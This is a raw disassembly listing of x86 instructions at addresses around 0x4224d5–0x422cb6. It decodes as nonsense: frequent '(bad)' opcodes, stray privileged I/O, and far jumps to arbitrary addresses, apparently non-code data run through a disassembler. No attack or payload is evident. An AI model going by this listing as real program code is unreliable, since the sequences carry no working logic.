  4224d5:	mov    ds:0xdce8b4b2,al
  4224da:	mov    WORD PTR [eax],ss
  4224dc:	push   edx
  4224dd:	add    ch,ch
  4224df:	(bad)  
  4224e0:	aaa    
  4224e1:	or     BYTE PTR [edi],dl
  4224e3:	(bad)  
  4224e4:	outs   dx,BYTE PTR ds:[esi]
  4224e5:	pop    ecx
  4224e6:	fimul  DWORD PTR [edi]
  4224e8:	adc    DWORD PTR [ebp-0x56d40659],ebp
  4224ee:	mov    bl,0xc6
  4224f0:	pop    ds
  4224f1:	cs sub al,0xfe
  4224f4:	adc    DWORD PTR [edi],esi
  4224f6:	xchg   BYTE PTR [di-0x2e8f],ch
  4224fb:	or     ch,BYTE PTR [ebx-0x38]
  4224fe:	scas   al,BYTE PTR es:[edi]
  4224ff:	repz imul eax,DWORD PTR [ebp+0x742ce10c],0xffffffd6
  422507:	dec    ebp
  422508:	mov    BYTE PTR [ebp-0x5e],cl
  42250b:	jo     0x4224d9
  42250d:	or     dl,BYTE PTR [edx+esi*4]
  422510:	stos   DWORD PTR es:[edi],eax
  422511:	popa   
  422512:	rcl    BYTE PTR [esi],0x4
  422515:	mov    edx,0x7e28b620
  42251a:	cld    
  42251b:	cmp    dh,ch
  42251d:	adc    eax,0x912638c1
  422522:	mov    ch,0x9a
  422524:	sahf   
  422525:	out    0xda,al
  422527:	nop
  422528:	lock cmp edi,edx
  42252b:	inc    ebp
  42252c:	cli    
  42252d:	ss inc ebp
  42252f:	fcomp  DWORD PTR [eax*4-0x17b93fc7]
  422536:	inc    esi
  422537:	in     eax,0x85
  422539:	ds mov esp,0xb81eb3c
  42253f:	xor    edi,0xb9776f1b
  422545:	push   ecx
  422546:	adc    DWORD PTR [esi],edx
  422548:	mov    bh,0xa3
  42254a:	inc    esp
  42254b:	out    dx,al
  42254c:	push   ebp
  42254d:	jns    0x422513
  42254f:	push   ebx
  422550:	pop    ss
  422551:	stos   DWORD PTR es:[edi],eax
  422552:	nop
  422553:	test   eax,0x6b9797f1
  422558:	(bad)  
  422559:	jns    0x4225c8
  42255b:	sbb    al,0xaf
  42255d:	repz dec edx
  42255f:	push   ecx
  422560:	fistp  DWORD PTR [ebx-0x76]
  422563:	dec    esi
  422564:	xor    edx,DWORD PTR [ebx+0x28]
  422567:	out    dx,eax
  422568:	or     dl,dl
  42256a:	pop    es
  42256b:	sub    al,0xc6
  42256d:	mov    ah,0xfd
  42256f:	sub    al,cl
  422571:	popa   
  422572:	adc    eax,0x3c7ece53
  422577:	(bad)  
  422578:	xchg   edx,eax
  422579:	test   DWORD PTR [eax-0x74606090],ecx
  42257f:	cs loopne 0x4225ea
  422582:	mov    ss:0xf175cb8e,al
  422588:	mov    dl,BYTE PTR [ebx+0x3f]
  42258b:	xor    eax,0x48de07fc
  422590:	xor    al,0xdf
  422592:	jne    0x422575
  422594:	and    ah,BYTE PTR [eax]
  422596:	jbe    0x4225c1
  422598:	sub    eax,0x3bb10ae6
  42259d:	scas   al,BYTE PTR es:[edi]
  42259e:	cld    
  42259f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225a0:	inc    ebp
  4225a1:	cmp    ecx,ecx
  4225a3:	fisub  WORD PTR [ecx-0x54]
  4225a6:	lea    edi,[esi+edi*4-0x16e9a80d]
  4225ad:	pop    esp
  4225ae:	ficomp WORD PTR [edx-0x18]
  4225b1:	fsub   DWORD PTR [ebx]
  4225b3:	cmp    eax,0x962eb4e7
  4225b8:	inc    ecx
  4225b9:	mov    bl,0x85
  4225bb:	pushf  
  4225bc:	mov    dh,dh
  4225be:	inc    ecx
  4225bf:	mov    ah,0xe7
  4225c1:	cmp    edi,ebp
  4225c3:	cmp    ebx,DWORD PTR [edi]
  4225c5:	inc    ebx
  4225c6:	in     eax,dx
  4225c7:	sbb    bh,BYTE PTR [ecx]
  4225c9:	lea    ebx,[edi+eiz*4]
  4225cc:	std    
	...
  4225d9:	add    cl,cl
  4225db:	xchg   esi,eax
  4225dc:	ins    DWORD PTR es:[edi],dx
  4225dd:	mov    dh,0x7f
  4225df:	(bad)  
  4225e0:	(bad)  
  4225e2:	out    0x3f,al
  4225e4:	nop
  4225e5:	sbb    eax,DWORD PTR [ebp-0x22]
  4225e8:	in     al,0x77
  4225ea:	mov    ebp,0xfb0001a0
  4225ef:	add    DWORD PTR [eax],eax
  4225f1:	add    BYTE PTR [ebx-0x11deb946],al
  4225f7:	add    bh,BYTE PTR [esi-0x4a]
  4225fa:	shl    ebp,cl
  4225fc:	arpl   WORD PTR [eax],cx
  4225fe:	xchg   ebp,eax
  4225ff:	pop    ss
  422600:	jb     0x42266e
  422602:	xor    al,0xf9
  422604:	jo     0x422615
  422606:	jne    0x422662
  422608:	push   edx
  422609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42260a:	mov    eax,0x8b8dc71
  42260f:	dec    ebp
  422610:	xchg   ebp,eax
  422611:	xchg   DWORD PTR [eax+0x20],ebx
  422614:	cmp    ecx,DWORD PTR [ebp+0x6e04627]
  42261a:	imul   esi,DWORD PTR [ebx-0x75],0x2c7606d8
  422621:	push   ecx
  422622:	fistp  QWORD PTR [esp+edx*8-0x21]
  422626:	repnz in al,0xe6
  422629:	xlat   BYTE PTR ds:[ebx]
  42262a:	push   esi
  42262b:	xchg   edx,eax
  42262c:	add    BYTE PTR [ebx+edi*8],cl
  42262f:	daa    
  422630:	cld    
  422631:	sbb    DWORD PTR [ebp+0x41],eax
  422634:	or     eax,0x4a4db764
  422639:	or     al,0x52
  42263b:	inc    ebp
  42263c:	popa   
  42263d:	adc    DWORD PTR ds:0xb72076a0,edi
  422643:	push   0xeaba5284
  422648:	pop    ds
  422649:	xchg   esp,eax
  42264a:	jp     0x422646
  42264c:	xchg   edi,eax
  42264d:	imul   esi,ecx,0xffffffe0
  422650:	rcl    cl,cl
  422652:	and    DWORD PTR [eax-0x51],0x4e
  422656:	ja     0x422635
  422658:	pop    ecx
  422659:	jle    0x422678
  42265b:	jbe    0x422654
  42265d:	ins    BYTE PTR es:[edi],dx
  42265e:	iret   
  42265f:	int    0x8f
  422661:	int    0xdd
  422663:	dec    ebp
  422664:	or     al,0x9
  422666:	sbb    DWORD PTR [edx-0x964fc27],esp
  42266c:	enter  0x6d82,0xe0
  422670:	shl    DWORD PTR [edi+0x36b3a8b2],0x6c
  422677:	shl    DWORD PTR [ebp+0x30],cl
  42267a:	adc    ebx,DWORD PTR [edx-0x4bdcbb8c]
  422680:	and    eax,0x74aa4693
  422685:	pushw  ds
  422687:	rcr    BYTE PTR [edi+0x26e9623],cl
  42268d:	jns    0x422672
  42268f:	lahf   
  422690:	inc    esi
  422691:	add    cl,dl
  422693:	imul   BYTE PTR [edi]
  422695:	ins    BYTE PTR es:[edi],dx
  422696:	call   0xec68:0xe0d6a09d
  42269d:	adc    DWORD PTR [ebp+0x64b477fc],esp
  4226a3:	outs   dx,BYTE PTR ds:[esi]
  4226a4:	push   es
  4226a5:	ds out 0x89,al
  4226a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226a9:	xchg   ecx,eax
  4226aa:	pop    edx
  4226ab:	aad    0xfb
  4226ad:	or     eax,0xddaea4a4
  4226b2:	adc    dh,BYTE PTR [edx]
  4226b4:	add    bh,BYTE PTR [ebp-0x3f]
  4226b7:	sar    edx,cl
  4226b9:	(bad)  [ebx]
  4226bb:	fistp  WORD PTR [edx-0x64]
  4226be:	sub    al,0x39
  4226c0:	je     0x42268e
  4226c2:	jl     0x4226be
  4226c4:	mov    eax,0xd625916e
  4226c9:	or     DWORD PTR [ecx],esp
  4226cb:	test   eax,esp
  4226cd:	xor    eax,DWORD PTR [edi]
  4226cf:	push   edi
  4226d0:	enter  0x452a,0x8c
  4226d4:	retf   0xa68
  4226d7:	int3   
  4226d8:	(bad)  
  4226d9:	push   ebx
  4226da:	pop    eax
  4226db:	call   0x981bbd9b
  4226e0:	xlat   BYTE PTR ds:[ebx]
  4226e1:	mov    ch,0xe6
  4226e3:	inc    ebx
  4226e4:	mov    ebx,0x13eeb55b
  4226e9:	add    dh,BYTE PTR [eax+0x6c82d44a]
  4226ef:	(bad)  
  4226f0:	js     0x422672
  4226f2:	mov    eax,0x90d4d6b0
  4226f7:	sub    DWORD PTR [ebp-0x48],eax
  4226fa:	enter  0x6b41,0x6b
  4226fe:	mov    ebx,0x65735aac
  422703:	fstp   TBYTE PTR [ebx]
  422705:	retf   0x83f3
  422708:	ss gs (bad) 
  42270b:	jmp    0x4226a8
  42270d:	inc    esi
  42270e:	mov    ebx,0xcb73d02
  422713:	das    
  422714:	mov    edi,0x2e83601
  422719:	loopne 0x422726
  42271b:	fld    QWORD PTR [edi-0x2279df2]
  422721:	stc    
  422722:	or     BYTE PTR [ecx-0x5d],bh
  422725:	cli    
  422726:	mov    bh,0xb3
  422728:	or     dh,BYTE PTR [ebx+0x4b865c77]
  42272e:	dec    ebx
  42272f:	hlt    
  422730:	repnz adc eax,edi
  422733:	sbb    ebx,ebp
  422735:	and    dl,ah
  422737:	mov    ebx,0xfaef42
  42273c:	or     edx,esi
  42273e:	icebp  
  42273f:	add    bl,bh
  422741:	inc    ebp
  422742:	cmp    DWORD PTR [edi+0x37],ecx
  422745:	push   ds
  422746:	xor    al,0x46
  422748:	leave  
  422749:	test   al,0x9a
  42274b:	and    DWORD PTR [edx+0x3b],esi
  42274e:	aaa    
  42274f:	adc    cl,BYTE PTR [esi]
  422751:	(bad)  
  422752:	jbe    0x4226f8
  422754:	aad    0xa2
  422756:	cmp    ebp,eax
  422758:	test   al,0x1f
  42275a:	cmp    eax,DWORD PTR [eax+0x51]
  42275d:	in     eax,dx
  42275e:	or     al,0x1c
  422760:	call   0x3d25b3b6
  422765:	adc    al,0xb6
  422767:	and    ebp,DWORD PTR [edi-0x8e1557]
  42276d:	cmp    al,bl
  42276f:	mov    BYTE PTR ds:0x7f7834cf,bh
  422775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422776:	add    eax,ebp
  422778:	sub    DWORD PTR [edx-0x22fa2dcf],ebx
  42277e:	sahf   
  42277f:	or     al,0xe3
  422781:	ret    0x8852
  422784:	xchg   ebp,eax
  422785:	or     al,0xed
  422787:	xlat   BYTE PTR ds:[ebx]
  422788:	outs   dx,BYTE PTR ds:[esi]
  422789:	sbb    dl,BYTE PTR [ebx]
  42278b:	sbb    eax,0xe142319
  422790:	test   BYTE PTR [edx-0x3294a893],dh
  422796:	lods   al,BYTE PTR ds:[esi]
  422798:	mov    edx,0xa05b4507
  42279d:	imul   edx,DWORD PTR [ebp+0x4668859a],0xa75fcdb7
  4227a7:	shl    DWORD PTR ds:0x4478884,1
  4227ad:	and    ebp,DWORD PTR [esi-0x3d]
  4227b0:	cdq    
  4227b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227b2:	mov    ecx,0x48992f8b
  4227b7:	sar    DWORD PTR [ebx],cl
  4227b9:	call   0x16a:0xc15724f0
  4227c0:	popa   
  4227c1:	das    
  4227c2:	inc    ch
  4227c4:	loop   0x422841
  4227c6:	cmp    eax,0x1afd7ac1
  4227cb:	ja     0x422797
  4227cd:	outs   dx,BYTE PTR ds:[si]
  4227cf:	or     eax,0xbd121056
  4227d4:	out    dx,al
  4227d5:	sub    edi,DWORD PTR [ebp+0xb]
  4227d8:	gs and eax,0xbcca34f3
  4227de:	out    0x27,al
  4227e0:	cwde   
  4227e1:	je     0x42285c
  4227e3:	push   ecx
  4227e4:	dec    esp
  4227e5:	jnp    0x42280a
  4227e7:	jbe    0x422864
  4227e9:	sub    bl,cl
  4227eb:	data16 jle 0x4227ee
	...
  4227fa:	dec    eax
  4227fb:	out    dx,eax
  4227fc:	ja     0x422869
  4227fe:	idiv   ebx
  422800:	pop    esp
  422801:	out    dx,eax
  422802:	cmp    DWORD PTR [ecx-0x7d151df0],ebx
  422808:	neg    BYTE PTR [ecx+0x1a2b8]
  42280e:	sti    
  42280f:	add    DWORD PTR [eax],eax
  422811:	add    BYTE PTR ds:0x7c644d60,cl
  422817:	mov    ds:0x4683b586,eax
  42281c:	adc    eax,0xd8fe9178
  422821:	inc    eax
  422822:	iret   
  422823:	aad    0x7a
  422825:	push   eax
  422826:	xchg   ebx,eax
  422827:	or     cl,BYTE PTR [ebp+ebx*8-0x3c]
  42282b:	pop    ebp
  42282c:	mov    ds:0xce2efa3e,eax
  422831:	jnp    0x422895
  422833:	mov    ecx,0xa26477bb
  422838:	jnp    0x4227e9
  42283a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42283b:	into   
  42283c:	inc    ecx
  42283d:	ret    
  42283e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42283f:	dec    ebp
  422840:	in     eax,dx
  422841:	int    0x2d
  422843:	dec    ecx
  422844:	inc    esi
  422845:	fmul   DWORD PTR [ebx-0x624520e]
  42284b:	ficom  WORD PTR [edx]
  42284d:	xchg   BYTE PTR [ecx+0x13201abc],ch
  422853:	mov    esp,es
  422855:	int3   
  422856:	mul    BYTE PTR [edi-0x129d99ee]
  42285c:	scas   al,BYTE PTR es:[edi]
  42285d:	mul    DWORD PTR [ebx]
  42285f:	sbb    BYTE PTR [edx-0x71],bh
  422862:	sbb    dh,bh
  422864:	xor    dl,ch
  422866:	arpl   sp,ax
  422868:	xchg   dl,bl
  42286a:	sar    DWORD PTR [esi],1
  42286c:	cdq    
  42286d:	jnp    0x42283c
  42286f:	icebp  
  422870:	jbe    0x42289c
  422872:	pushf  
  422873:	pushf  
  422874:	sub    BYTE PTR [ecx+0x17],cl
  422877:	or     DWORD PTR [edx+0x11],esi
  42287a:	clc    
  42287b:	jnp    0x422814
  42287d:	mov    ss,WORD PTR [edx+0x74fdafdc]
  422883:	leave  
  422884:	mov    WORD PTR [eax+0xa],gs
  422887:	jecxz  0x422898
  422889:	int    0x9b
  42288b:	sub    DWORD PTR ds:0x9abc6ba5,ebp
  422891:	pop    ss
  422892:	sub    DWORD PTR [edi-0x32],0xffffffb3
  422896:	jl     0x4228e6
  422898:	iret   
  422899:	mov    al,0x11
  42289b:	sbb    al,0xef
  42289d:	cmp    ah,ch
  42289f:	adc    al,0x8b
  4228a1:	cmp    ebx,DWORD PTR [ebp+0x6250026a]
  4228a7:	(bad)  
  4228a8:	cmp    edi,DWORD PTR [ebp-0x262e68c]
  4228ae:	sbb    eax,DWORD PTR [esi-0x5]
  4228b1:	(bad)  
  4228b2:	xchg   edi,eax
  4228b3:	shl    BYTE PTR [ecx],cl
  4228b5:	into   
  4228b6:	push   ss
  4228b7:	and    ch,BYTE PTR [ecx-0x4befb715]
  4228bd:	add    edi,ebx
  4228bf:	push   edx
  4228c0:	mov    esp,0xdd4efa1c
  4228c5:	adc    al,BYTE PTR [eax]
  4228c7:	sbb    eax,0xbc7ad17c
  4228cc:	mov    DWORD PTR [edi-0x59694ab5],ecx
  4228d2:	mov    eax,0x5789db4b
  4228d7:	mov    edx,0xf0b3b97f
  4228dc:	dec    edi
  4228dd:	in     al,dx
  4228de:	data16 mov dl,0xc0
  4228e1:	mov    al,0x61
  4228e3:	add    al,0xb0
  4228e5:	and    DWORD PTR [ebx-0x46],0x70
  4228e9:	push   edx
  4228ea:	inc    edi
  4228eb:	fld    DWORD PTR [eax+0x53]
  4228ee:	and    dh,dh
  4228f0:	je     0x42290c
  4228f2:	clc    
  4228f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228f4:	outs   dx,DWORD PTR ds:[esi]
  4228f5:	cmp    esp,DWORD PTR [ecx+0x20b66ac0]
  4228fb:	mov    eax,0xf5200519
  422900:	pop    ss
  422901:	jbe    0x42294b
  422903:	int    0x5a
  422905:	adc    ch,0x33
  422908:	ds cli 
  42290a:	xor    ebx,ebp
  42290c:	xchg   esi,eax
  42290d:	sub    esi,ecx
  42290f:	inc    edx
  422910:	in     eax,dx
  422911:	cdq    
  422912:	sub    al,0x51
  422914:	imul   eax,DWORD PTR [ecx],0x9baa6d56
  42291a:	or     edi,DWORD PTR [ecx+0x27a4d7cc]
  422920:	call   0x7132:0x963b31aa
  422927:	dec    ebx
  422928:	stos   BYTE PTR es:[edi],al
  422929:	ja     0x4228f5
  42292b:	cmp    edi,eax
  42292d:	adc    BYTE PTR [eax-0x7667cd5a],0x5f
  422934:	retf   0xfb3c
  422937:	imul   DWORD PTR [edi+0x43ac99e1]
  42293d:	out    dx,al
  42293e:	shl    DWORD PTR [edx],1
  422940:	add    eax,0x42ca8a7d
  422945:	dec    edx
  422946:	in     eax,dx
  422947:	mov    dh,ah
  422949:	jo     0x4229c4
  42294b:	idiv   BYTE PTR [edi+0x52c80d29]
  422951:	ss jb  0x422955
  422954:	and    cl,cl
  422956:	xor    edx,DWORD PTR [esp+0x57170801]
  42295d:	mov    esi,0x6cfa2ffc
  422962:	push   ds
  422963:	adc    cl,al
  422965:	retf   0x189b
  422968:	ds mov cl,0x40
  42296b:	icebp  
  42296c:	aad    0x21
  42296e:	pop    ebx
  42296f:	mov    dh,0x53
  422971:	out    dx,eax
  422972:	inc    ebp
  422973:	fist   DWORD PTR [eax+0xd]
  422976:	xor    BYTE PTR [edi],bl
  422978:	and    ebp,DWORD PTR [eax-0xd1e3563]
  42297e:	lods   al,BYTE PTR ds:[esi]
  42297f:	xchg   ebp,eax
  422980:	and    dh,BYTE PTR [edx]
  422982:	dec    ecx
  422983:	jmp    0xd163:0x5aa069e4
  42298a:	lods   al,BYTE PTR ds:[esi]
  42298b:	mov    esi,0x9cc65311
  422990:	inc    esi
  422991:	fwait
  422992:	jge    0x422a0a
  422994:	mov    WORD PTR [ebp-0x5d],ss
  422997:	inc    esp
  422998:	jae    0x4229cd
  42299a:	xchg   ebx,eax
  42299b:	fsubr  st,st(6)
  42299d:	pop    es
  42299e:	xor    eax,0xeec2f507
  4229a3:	jo     0x422a01
  4229a5:	jmp    0x7103:0x4b79d4b3
  4229ac:	repnz (bad) 
  4229ae:	pop    esp
  4229af:	out    dx,eax
  4229b0:	sbb    dh,BYTE PTR [esi]
  4229b2:	popa   
  4229b3:	xor    ch,BYTE PTR [edi+0x34]
  4229b6:	jbe    0x422980
  4229b8:	stc    
  4229b9:	test   DWORD PTR [ecx-0x7e],eax
  4229bc:	(bad)  
  4229bd:	imul   edx,ecx,0x20
  4229c0:	push   edi
  4229c1:	(bad)  
  4229c2:	je     0x4229fb
  4229c4:	test   al,0xe0
  4229c6:	data16 mov bh,0x7a
  4229c9:	hlt    
  4229ca:	stos   BYTE PTR es:[edi],al
  4229cb:	aaa    
  4229cc:	push   ebx
  4229cd:	add    DWORD PTR [ecx],0x60c25009
  4229d3:	fnstcw WORD PTR [ebp+0x5f]
  4229d6:	cmp    ecx,ecx
  4229d8:	jmp    DWORD PTR [ebp-0x5d15c250]
  4229de:	adc    al,0x5b
  4229e0:	fsub   QWORD PTR [eax+0x36]
  4229e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229e4:	jge    0x422a39
  4229e6:	enter  0x16e3,0xf2
  4229ea:	jns    0x422a13
  4229ec:	push   esp
  4229ed:	test   BYTE PTR [esi],al
  4229ef:	dec    edi
  4229f0:	and    cl,BYTE PTR [edi-0x26]
  4229f3:	jmp    0xfbe75e15
  4229f8:	adc    DWORD PTR [edx+0x3c],edi
  4229fb:	nop
  4229fc:	nop
  4229fd:	ror    BYTE PTR [edx-0x29],1
  422a00:	jge    0x422a18
  422a02:	js     0x42299e
  422a04:	mov    dh,0x96
  422a06:	scas   al,BYTE PTR es:[edi]
  422a07:	xor    DWORD PTR [ecx+0x14],ecx
  422a0a:	cmp    esi,DWORD PTR [ebx+0x5c]
	...
  422a19:	add    BYTE PTR [eax+0x5be35ae3],dh
  422a1f:	sti    
  422a20:	mov    ecx,0xeb2b3af3
  422a25:	inc    ecx
  422a26:	cmp    edx,DWORD PTR [ebx]
  422a28:	arpl   WORD PTR [esi+0x1a4b3],bx
  422a2e:	sti    
  422a2f:	add    DWORD PTR [eax],eax
  422a31:	add    BYTE PTR [ebp+0x33],al
  422a34:	jmp    0x7ebb5fee
  422a39:	pop    edi
  422a3a:	ja     0x422a78
  422a3c:	inc    ecx
  422a3d:	pop    esi
  422a3e:	fld    TBYTE PTR [ebx+0x5a]
  422a41:	adc    DWORD PTR [esi-0x4f8eb117],ebx
  422a47:	ins    DWORD PTR es:[edi],dx
  422a48:	mov    edi,0x581007b4
  422a4d:	mov    ecx,0x4f07f69f
  422a52:	xor    bl,bh
  422a54:	push   edx
  422a55:	mov    cl,0x87
  422a57:	adc    esp,ecx
  422a59:	call   0x89b6:0xef918a62
  422a60:	ins    BYTE PTR es:[edi],dx
  422a61:	pop    eax
  422a62:	jbe    0x422a31
  422a64:	mov    bl,al
  422a66:	push   ebx
  422a67:	cli    
  422a68:	inc    ebx
  422a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a6a:	pop    ecx
  422a6b:	inc    edx
  422a6c:	jge    0x422a3f
  422a6e:	pop    ss
  422a6f:	mov    edx,0x69d9af64
  422a74:	xor    ecx,0xc6435ec3
  422a7a:	(bad)  
  422a7b:	mov    edx,0x314c463c
  422a80:	sahf   
  422a81:	jb     0x422aa9
  422a83:	and    eax,0xb9df6abd
  422a88:	retf   
  422a89:	mov    ?,WORD PTR [esi-0x659a0b6e]
  422a8f:	mov    bl,0x5a
  422a91:	call   0x66851555
  422a96:	and    ecx,DWORD PTR [esi+0x2]
  422a99:	push   es
  422a9a:	outs   dx,BYTE PTR ds:[esi]
  422a9b:	(bad)  
  422a9c:	std    
  422a9d:	lods   eax,DWORD PTR ds:[esi]
  422a9e:	add    al,0x6e
  422aa0:	sub    BYTE PTR [eax+0x394ea224],ch
  422aa6:	and    DWORD PTR [edi+esi*2+0x69c24957],0x66
  422aae:	adc    eax,0xecab1a6b
  422ab3:	push   ds
  422ab4:	or     eax,0x5bc0c0d7
  422ab9:	js     0x422af9
  422abb:	bnd jne 0x422b14
  422abe:	js     0x422af3
  422ac0:	mov    ds:0x3836cfd7,eax
  422ac5:	xchg   ecx,eax
  422ac6:	out    dx,al
  422ac7:	call   0x922d4c55
  422acc:	adc    BYTE PTR [edx],0x31
  422acf:	js     0x422acf
  422ad1:	in     al,dx
  422ad2:	sti    
  422ad3:	sbb    ecx,DWORD PTR [edi]
  422ad5:	mov    DWORD PTR [edx],edi
  422ad7:	icebp  
  422ad8:	add    eax,0xc7ef2b05
  422add:	jb     0x422ad1
  422adf:	xchg   ebp,eax
  422ae0:	das    
  422ae1:	inc    edx
  422ae2:	fwait
  422ae3:	sbb    ch,dh
  422ae5:	repz ret 
  422ae7:	add    DWORD PTR [edx+0x4d],ebx
  422aea:	je     0x422ae8
  422aec:	mov    cx,sp
  422aef:	fistp  QWORD PTR [ebp-0x51]
  422af2:	pop    ebp
  422af3:	xlat   BYTE PTR ds:[ebx]
  422af4:	aas    
  422af5:	mov    bh,0xbe
  422af7:	or     ebp,DWORD PTR [esi+ebp*2+0x12]
  422afb:	sub    eax,DWORD PTR [ecx-0x189dc070]
  422b01:	cmp    al,0x68
  422b03:	sahf   
  422b04:	stc    
  422b05:	cmp    eax,0x197fb35a
  422b0a:	sbb    esi,DWORD PTR ds:0x5f20f197
  422b10:	aam    0x73
  422b12:	pusha  
  422b13:	jl     0x422b12
  422b15:	jb     0x422b18
  422b17:	es xchg esi,eax
  422b19:	pop    es
  422b1a:	mov    esi,0x6a8f2ab6
  422b1f:	rol    BYTE PTR ds:0xdbf169ac,cl
  422b25:	add    edx,ecx
  422b27:	and    DWORD PTR [eax+0x7320b2fc],0x58
  422b2e:	mov    DWORD PTR [edx+0x6a],eax
  422b31:	add    BYTE PTR [esi],al
  422b33:	cmc    
  422b34:	loope  0x422bac
  422b36:	dec    edx
  422b37:	enter  0x37bb,0x56
  422b3b:	or     esi,DWORD PTR [edx-0xc]
  422b3e:	sbb    ebx,DWORD PTR [edi+edi*1]
  422b41:	or     esi,0x596bdfbf
  422b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b48:	sub    DWORD PTR [eax+0x3a],ebx
  422b4b:	or     al,0x72
  422b4d:	lods   al,BYTE PTR ds:[esi]
  422b4e:	(bad)  
  422b50:	(bad)
  422b54:	fidiv  WORD PTR [edi+0x7f96b925]
  422b5a:	mov    BYTE PTR [edi+0x71],dh
  422b5d:	cmp    edi,ebx
  422b5f:	mov    edx,0xbc7d0ff7
  422b64:	out    dx,eax
  422b65:	push   edi
  422b66:	jg     0x422af8
  422b68:	sub    bh,BYTE PTR [esi-0x7c928639]
  422b6e:	enter  0x1f48,0x9
  422b72:	xor    al,0xf0
  422b74:	cmp    BYTE PTR [edx-0x4e],0x1
  422b78:	aam    0x75
  422b7a:	dec    edx
  422b7b:	dec    ebp
  422b7c:	cld    
  422b7d:	dec    edx
  422b7e:	(bad)  
  422b7f:	retf   
  422b80:	jmp    0x1646533e
  422b85:	push   esi
  422b86:	xlat   BYTE PTR ds:[ebx]
  422b87:	mov    ah,BYTE PTR [eax]
  422b89:	jbe    0x422b1e
  422b8b:	and    DWORD PTR [esi-0x6becfa1],eax
  422b91:	inc    ebp
  422b92:	fsubr  st,st(1)
  422b94:	and    al,0xc3
  422b96:	lods   al,BYTE PTR ds:[esi]
  422b97:	add    BYTE PTR [ebx+ebx*4+0x65],bl
  422b9b:	fdivr  st,st(0)
  422b9d:	mov    bl,0x67
  422b9f:	in     al,dx
  422ba0:	ret    
  422ba1:	add    al,0xe0
  422ba3:	mov    eax,cs
  422ba5:	mov    edi,edi
  422ba7:	adc    al,0xf5
  422ba9:	(bad)  
  422baa:	fs (bad) 
  422bac:	jge    0x422bdb
  422bae:	mov    BYTE PTR [ebx+0x6d3d690f],al
  422bb4:	sub    ecx,esp
  422bb6:	ja     0x422c0d
  422bb8:	cmp    esi,ebp
  422bba:	xor    edx,ecx
  422bbc:	xor    ah,BYTE PTR [esi+0x411b4de]
  422bc2:	or     BYTE PTR [edi],0x8f
  422bc5:	jmp    0xaeb44dee
  422bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bcb:	loop   0x422bd9
  422bcd:	(bad)  
  422bcf:	adc    eax,0x3664291c
  422bd4:	push   edx
  422bd5:	cli    
  422bd6:	inc    DWORD PTR [edi+0x117a3254]
  422bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bdd:	loop   0x422c0c
  422bdf:	inc    ecx
  422be0:	in     al,0xde
  422be2:	ins    BYTE PTR es:[edi],dx
  422be3:	push   ds
  422be4:	xor    al,0x2c
  422be6:	sbb    dh,dh
  422be8:	loop   0x422c4d
  422bea:	aaa    
  422beb:	sub    ebp,0x1a670bf
  422bf1:	(bad)  
  422bf2:	jle    0x422b8e
  422bf4:	je     0x422c42
  422bf6:	rol    BYTE PTR [esi+0x77],1
  422bf9:	and    eax,0x7fc6b8c
  422bfe:	sub    DWORD PTR [edx],esi
  422c00:	jle    0x422c56
  422c02:	sahf   
  422c03:	or     esi,DWORD PTR [ebx+0x47]
  422c06:	xchg   DWORD PTR [ebx+0x39],esi
  422c09:	loop   0x422c0d
  422c0b:	imul   edi,DWORD PTR [ebx-0x51],0x674e7bf7
  422c12:	mov    eax,ds:0x356f2b56
  422c17:	(bad)  
  422c18:	dec    edi
  422c19:	xor    DWORD PTR [eax+0x10],edi
  422c1c:	or     eax,0xec83f481
  422c21:	jns    0x422beb
  422c23:	adc    eax,0xcd84dac3
  422c28:	add    dh,BYTE PTR [ecx+0xb84470]
	...
  422c3a:	xor    eax,0xbf06168e
  422c3f:	sahf   
  422c40:	xor    eax,0x913f27bf
  422c45:	sub    ebp,edx
  422c47:	fisubr DWORD PTR [edx]
  422c49:	gs scas al,BYTE PTR es:[edi]
  422c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4c:	add    DWORD PTR [eax],eax
  422c4e:	sti    
  422c4f:	add    DWORD PTR [eax],eax
  422c51:	add    bh,ah
  422c53:	loop   0x422c60
  422c55:	cmp    esi,edi
  422c57:	rol    cl,1
  422c59:	jge    0x422c91
  422c5b:	lahf   
  422c5c:	jecxz  0x422cbf
  422c5e:	(bad)  
  422c5f:	cmc    
  422c60:	aad    0x81
  422c62:	(bad)  
  422c63:	dec    DWORD PTR [edi+0x1a]
  422c66:	mov    ch,0x98
  422c68:	jns    0x422cc7
  422c6a:	adc    DWORD PTR [ecx-0x9624516],esp
  422c70:	adc    al,0x15
  422c72:	xor    ebp,DWORD PTR [ebp+0x4447a82d]
  422c78:	dec    esp
  422c79:	das    
  422c7a:	addr16 fwait
  422c7c:	mov    ecx,0xd6bcc110
  422c81:	add    ch,BYTE PTR [eax]
  422c83:	aas    
  422c84:	inc    ebx
  422c85:	rol    DWORD PTR [eax+0x2b],1
  422c88:	xor    BYTE PTR [eax],0x57
  422c8b:	sbb    DWORD PTR [ebp+0x42],edi
  422c8e:	push   eax
  422c8f:	xor    dh,BYTE PTR [ebx+0x465ed02f]
  422c95:	pusha  
  422c96:	and    al,0xbf
  422c98:	or     dl,BYTE PTR [esi+ebx*2+0x1c5e94ed]
  422c9f:	pop    edi
  422ca0:	mov    dh,0xcd
  422ca2:	das    
  422ca3:	(bad)  
  422ca4:	not    dh
  422ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ca7:	jge    0x422d06
  422ca9:	xchg   ebx,eax
  422caa:	les    esi,FWORD PTR [edx+edx*4-0x56]
  422cae:	push   eax
  422caf:	aaa    
  422cb0:	adc    ch,BYTE PTR [ecx]
  422cb2:	mov    dh,0x14
  422cb4:	lods   eax,DWORD PTR ds:[esi]
  422cb5:	scas   eax,DWORD PTR es:[edi]
  422cb6:	pop    esp
